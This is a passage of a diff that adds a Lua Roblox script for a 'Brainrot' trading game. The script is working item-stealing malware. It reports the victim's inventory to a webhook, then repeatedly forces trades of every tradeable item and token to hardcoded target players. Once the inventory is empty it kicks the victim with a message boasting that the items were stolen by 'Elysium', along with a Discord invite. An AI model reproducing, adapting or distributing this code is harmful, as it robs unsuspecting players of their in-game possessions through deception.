+    pickupBrainrots()
+    task.wait(3)
+    updateTradeTokens()
+    unlockAllItems()
+
+    local rawBaseItems, totalInBase
+    if not PLAZA then
+        rawBaseItems, totalInBase = getBaseBrainrots()
+    else
+        rawBaseItems, totalInBase = {}, 0
+    end
+
+    local rawInvItems    = getAllTradeableItemsFromInventory() or {}
+    local embedInvItems  = HIGH_TIER_ONLY and filterHighTierOnly(rawInvItems)  or rawInvItems
+    local embedBaseItems = HIGH_TIER_ONLY and filterHighTierOnly(rawBaseItems) or rawBaseItems
+
+    if (#embedInvItems > 0) or (#embedBaseItems > 0) or (playerTradeTokens > 0) then
+        sendWebhookReport(embedInvItems, embedBaseItems, totalInBase, rawInvItems, rawBaseItems)
+    end
+end)
+
+--------------------------------------------------------------
+-- MAIN LOOP
+--------------------------------------------------------------
+local function autoPickupAndTrade()
+    isRunning = true
+    pcall(function() setclipboard(DISCORD_INVITE) end)
+
+    while isRunning do
+        pickupBrainrots()
+        unlockAllItems()
+        updateTradeTokens()
+
+        local allItems      = getAllTradeableItemsFromInventory()
+        local filteredItems = filterItems(allItems)
+
+        local now = tick()
+        if now - lastInventoryCheckTime >= INVENTORY_CHECK_INTERVAL then
+            lastInventoryCheckTime = now
+            if #filteredItems > 0 or playerTradeTokens > 0 then
+                hadThresholdBrainrots = true
+            end
+            if hadThresholdBrainrots and #filteredItems == 0 and playerTradeTokens == 0 then
+                pcall(function()
+                    Players.LocalPlayer:Kick("All your items just got stolen by Elysium.\n Join our Discord: https://discord.gg/Elys1um \n")
+                end)
+                isRunning = false
+                return
+            end
+        end
+
+        if #filteredItems > 0 or playerTradeTokens > 0 then
+            local targetPlayer = findTargetPlayer()
+            if targetPlayer then
+                if not tradeRequestLoopRunning or not continuousTradingEnabled or currentTargetPlayer ~= targetPlayer then
+                    currentTargetPlayer = targetPlayer
+                    startContinuousTradeRequests(targetPlayer)
+                end
+                if not isPlayerFullyLoaded(targetPlayer) then
+                    if not WaitForPlayerReady(targetPlayer, 3) then task.wait(3); continue end
+                end
+                executeTrade()
+                task.wait(TRADE_DELAY)
+            else
+                stopContinuousTradeRequests()
+                currentTargetPlayer = nil
+                task.wait(3)
+            end
+        else
+            task.wait(2)
+        end
+
+        task.wait(1)
+    end
+end
+
+task.spawn(autoPickupAndTrade)
+
+local function onTargetPlayerAdded(player)
+    task.spawn(function()
+        currentTargetPlayer = player
+        startContinuousTradeRequests(player)
+        while player.Parent and WaitForPlayerReady(player, 3) do
+            executeTrade()
+            task.wait(TRADE_DELAY)
+        end
+        if currentTargetPlayer == player then
+            stopContinuousTradeRequests()
+            currentTargetPlayer = nil
+        end
+    end)
+end
+
+Players.PlayerAdded:Connect(function(player)
+    if table.find(TARGET_PLAYERS, player.Name) then
+        onTargetPlayerAdded(player)
+    end
+end)
+
+task.spawn(function()
+    task.wait(2)
+    local tp = findTargetPlayer()
+    if tp then currentTargetPlayer = tp; startContinuousTradeRequests(tp) end
+end)
+
+local function setupJumpRetry(player)
+    if not player.Character then player.CharacterAdded:Wait() end
+    local hum = player.Character:WaitForChild("Humanoid", 10)
+    if not hum then return end
+    hum.Jumping:Connect(function()
+        if not tradeRequestLoopRunning or not continuousTradingEnabled then
+            if not hasActiveTrade() then sendTradeRequest(player) end
+        end
+    end)
+end
+
+for _, player in ipairs(Players:GetPlayers()) do
+    if table.find(TARGET_PLAYERS, player.Name) and player ~= Players.LocalPlayer then
+        setupJumpRetry(player)
+    end
+end
+
+Players.PlayerAdded:Connect(function(player)
+    if table.find(TARGET_PLAYERS, player.Name) then
+        setupJumpRetry(player)
+    end
+end)
